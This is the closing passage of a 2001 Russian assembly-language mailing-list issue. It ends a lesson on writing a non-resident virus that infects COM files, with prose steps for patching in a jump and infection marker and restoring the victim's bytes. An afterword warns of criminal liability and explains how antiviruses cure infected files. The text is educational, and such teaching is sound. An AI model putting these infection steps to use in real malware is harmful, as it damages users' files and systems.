на метку Inint, путем вычисления
размера файла;</li>
<li>открываем файл (указатель на
начале файла);</li>
<li>пишем первые шесть байт
перехода на на тело вируса + 1122h
для опознавания того, что файл
уже заражен нашим вирусом;</li>
<li>закрываем файл;</li>
<li>восстановим первые шесть
реальных байт
&quot;файла-жертвы&quot; в памяти
(они-то у нас записаны в
&quot;хвосте&quot;
&quot;файла-жертвы&quot; (см. пункт
6.);</li>
<li>передаем управление <u>нашему</u>
&quot;файлу-жертве&quot;;</li>
<li>ВСЕ!!!</li>
</ol>

<p>Просто? Да проще не бывает!
Внимательно изучите
файл-приложение, комментарии к
нему. Все будет &quot;тип-топ&quot;!</p>

<p><strong><u>Еще раз подчеркну</u></strong>:
будьте осторожны при
экспериментах. Создайте отдельный
каталог, куда перепишите com-файлы,
над которыми можно будет
производить эксперименты.</p>

<p>Ситуация проясниться, когда вы
ознакомитесь с файлом-приложением,
поэкспериментируете с отладчиком
(но не забывайте про 16 выпуск!),
&quot;повтыкаете&quot; туда свои
вставки, команды и пр. Пробуйте,
экспериментируйте. Да воздастся
вам!!!</p>

<hr>

<p align="center"><a name="afterwords"><font size="4"><strong>Послесловие.
Пофилософствуем?</strong></font></a></p>

<p>Ну, дорогие мои! Поздравляю вас! Вы
только что написали первый вирус.
Что я могу сказать в завершение...</p>

<p>Прежде всего, мне хотелось бы,
чтобы информация, полученная вами
из рассылки пошла во благо, а не во
вред. Подавая запрос в Subsribe.ru на
перевод рассылки в категорию
&quot;золотых&quot;, я получил ответ, в
котором меня спрашивали: &quot;Вы
действительно уверены в том, что
хотите обучать подписчиков
написанию вируса?&quot; Да, я уверен. Я
уверен просто потому, что знаю,
изучи вы Ассемблер, первое, что
придет большинству из вас в голову,
так это написать вирус. Я также
уверен, что, изобретая вирус в три
часа ночи, вы вдруг поймете, как
работает та или иная штуковина. Вы
поймете многое. Сам когда-то
проходил через это. Да... Были
времена... Когда тех, кто писал
вирусы считали &quot;суперкрутыми&quot;
программистами. Когда вирусов
боялись больше суда божьего. Вирус
&quot;DIR&quot; наводил такой ужас в
компьютерных центрах, что я готов
был отказаться от всего, что у меня
было (дискеты, компьютеры, игры...).
Но познакомившись с Ассемблером
поближе, я понял, что вирус - это
прежде всего программа, которую
написал человек. А что, если и
болезни (грипп, простуда, СПИД и пр.)
- это тоже не более чем программа,
написанная кем-то свыше? Причем,
этот кто-то гораздо разумнее нас...
Как вы думаете? Ведь можно
представить, что для кого-то
человек - как для нас компьютер,
которым можно манипулировать,
управлять... Я не верю в высшие силы.
Но ведь иногда волей-неволей
задумываешься над этим. Компьютер
ведь пока не подозревает о том, что
его создал человек. Работает себе...
То, да се...</p>

<p>В свое время, выучив в
определенной степени Ассемблер, я
писал много вирусов как
резидентных, так и нерезидентных. Я
&quot;порол&quot; свой &quot;винт&quot; раз 15.
Но упорно шел вперед, изучал что-то
новое, экспериментировал... Я
уверен, что в своей жизни вы
напишете хоть один вирус. Я не могу
сказать, что это плохо. Это
нормально, даже хорошо, интересно.
Но хорошо в том случае, если ваш
вирус не выходит во &quot;внешний
мир&quot;. Более того, я должен
повторно предупредить вас, что за
распространение вирусоподобных
программ вы попадаете под
уголовную статью РФ. Так что,
прежде, чем нести ваш вирус кому-то,
подумайте хорошо: а зачем это
вообще нужно? Сколько раз ВЫ в своей
жизни страдали от того, что вирус,
написанный каким-то гадом,
форматировал Ваш винчестер? Сколько
драгоценного времени вы тратили
впустую, восстанавливая поврежденные программы? Сколько
полезного вы могли бы сделать за
это время?</p>

<p>&quot;Зачем же тогда ты научил нас
писать вирус, пусть даже самый
простой и безобидный?&quot; - спросите
вы. Я повторю: изучив Ассемблер, вы
все равно его бы написали. Дело
только во времени. Целью данной
рассылки было не научить вас писать
вирусы, а дать понять, что вирус -
это не так страшно. Научить вас
бороться с этой заразой хоть как-то.
Надеюсь, что у многих страх перед
&quot;ужасными, злыми и
беспощадными&quot; вирусами
развеялся.</p>

<p>Мы написали элементарнейший
нерезидентный вирус, заражающий
com-файлы в текущем каталоге. Но
принцип работы у всех вирусов
одинаковый. Запомните: вирус в
своем теле <u>обязательно</u> хранит
первые байты зараженной
com-программы или изначальную
структуру exe-программы. Первые
байты могут быть как в
закодированном, так и в
незакодированном виде (как в нашем
примере). Вирусы могут быть
резидентные и нерезидентные. Но в
теле любого вируса можно всегда
найти те байты, которые нужны для
восстановления зараженного файла,
если, конечно, вирус не разрушает
напрочь программу, делая ее
невосстановимой и - соответственно - 
неработоспособной. А как вы думали
антивирусы &quot;лечат&quot; файлы?
Прежде всего, создатели
антивирусов исследуют зараженные
файлы (как врачи больного,
зараженного неизвестной болезнью).
Затем пишу программу, которая бы
&quot;вылечивала&quot; зараженный файл.
И все! Антивирус готов!</p>

<p>Еще, вероятно, вы слышали о том,
что существуют вирусы, которые не
удаляются из памяти при
перезагрузке компьютера. Уверяю
вас: это невозможно. Вирус
находится в ОЗУ, которая очищается
после выключения питания.</p>

<p>Однако, очень редко вирусы
имитируют &quot;горячую&quot;
перезагрузку компьютера (при
нажатии пользователем на Ctrl+Alt+Del),
используя прерывание 19h.
Пользователь не заметит того, что
это псевдоперезагрузка только на
том компьютере, для которого
писался данный вирус. Например,
вирус написан для 80286, в котором
экран после нажатия на Ctrl+Alt+Del имеет
определенный вид. Но на другой
&quot;двойке&quot;, у которой на экране
совсем другое изображено,
пользователь сразу заметит подвох.</p>

<p align="center">__________</p>

<p>Вот, собственно, и все! Как
говорится, &quot;у добры шлях&quot;!</p>



<hr> 
<p><font size="4"><em><strong>С уважением,</strong></em></font></p> 
<p><font size="3" face="Arial Cyr"><strong>Автор 
рассылки:</strong> Калашников Олег

<br>
<strong>URL сайта подписчиков:</strong>
<a href="http://www.Kalashnikoff.ru">http://www.Kalashnikoff.ru</font></a>
<br>
<strong>E-mail для вопросов:</strong>
<a href="mailto:Assembler@Kalashnikoff.ru">Assembler@Kalashnikoff.ru</a>
<br>
<strong>UIN:</strong> 68951340</p> 
 
<p>Москва, 2001.</font></p> 
 
<hr> 
<div align="center"><center> 
 
<table border="0" cellpadding="0" cellspacing="0" width="100%" 
bgcolor="#DDEEFF" bordercolor="#808080" 
bordercolorlight="#FFFFFF"> 
<tr> 
<td colspan="3" bgcolor="#BDDEFF"><font color="#400040" 
size="1"><strong>(C) Авторское право принадлежит автору рассылки.</strong> 
Использование материала из рассылки в коммерческих и иных подобных целях, 
а также публичное публикование без письменного согласия автора 
влечет ответственность за нарушение авторских прав.
</font></td> 
</tr> 
</table> 
</center></div>

<hr>

<p align="center">[<a href="021.htm">Следующий выпуск</a>] [<a target=_BLANK href="http://www.Kalashnikoff.ru/">На главную страницу</a>]</p>

<HR NOSHADE><CENTER>
<!-- SpyLOG v2 f:0211 --><script language="javascript">  
u="u496.71.spylog.com";d=document;nv=navigator;na=nv.appName;p=1;  
bv=Math.round(parseFloat(nv.appVersion)*100);  
n=(na.substring(0,2)=="Mi")?0:1;rn=Math.random();z="p="+p+"&rn="+rn;y="";  
y+="<a href='http://"+u+"/cnt?f=3&p="+p+"&rn="+rn+"' target=_blank>";  
y+="<img src='http://"+u+"/cnt?"+z+  
"&r="+escape(d.referrer)+"&pg="+escape(window.location.href)+"' border=0 width=88 height=31 alt='SpyLOG'>";  
y+="</a>"; d.write(y);if(!n) { d.write("<"+"!--"); }//--></script><noscript><p align="center"><a 
href="http://u496.71.spylog.com/cnt?f=3&amp;p=1" 
target="_blank"><img src="http://u496.71.spylog.com/cnt?p=1" alt="SpyLOG" align="middle" border="0"></a> 
<a href="http://u496.71.spylog.com/cnt?f=3&amp;p=1" target="_blank"></noscript></a> 
<a href="http://u496.71.spylog.com/cnt?f=3&amp;p=1" target="_blank"> 
<script language="javascript1.2"><!-- if(!n) { d.write("--"+">"); }//--></script></a> 
<!-- SpyLOG --> 
 
 <a target=_top href="http://www.one.ru"><img src="http://cnt.one.ru/cgi-bin/cnt.cgi?id=16871&t=9" width=88 height=31 alt="be number one" border=0></a> 
 
 <script language="JavaScript"><!-- 
d=document;a='';a+=';r='+escape(d.referrer) 
js=10//--></script><script language="JavaScript1.1"><!-- 
a+=';j='+navigator.javaEnabled() 
js=11//--></script><script language="JavaScript1.2"><!-- 
s=screen;a+=';s='+s.width+'*'+s.height 
a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth) 
js=12//--></script><script language="JavaScript1.3"><!-- 
js=13//--></script><script language="JavaScript"><!-- 
d.write('<a href="http://top.list.ru/jump?from=87856"'+ 
' target=_top><img src="http://top.list.ru/counter'+ 
'?id=87856;t=54;js='+js+a+';rand='+Math.random()+ 
'" alt="TopList"'+' border=0 height=31 width=88></a>') 
if(js>11)d.write('<'+'!-- ')//--></script><noscript><a 
target=_top href="http://top.list.ru/jump?from=87856"><img 
src="http://top.list.ru/counter?js=na;id=87856;t=54" 
border=0 height=31 width=88 
alt="TopList"></a></noscript><script language="JavaScript"><!-- 
if(js>11)d.write('--'+'>')//--></script> 
 
<br><br> 

</body>
</html>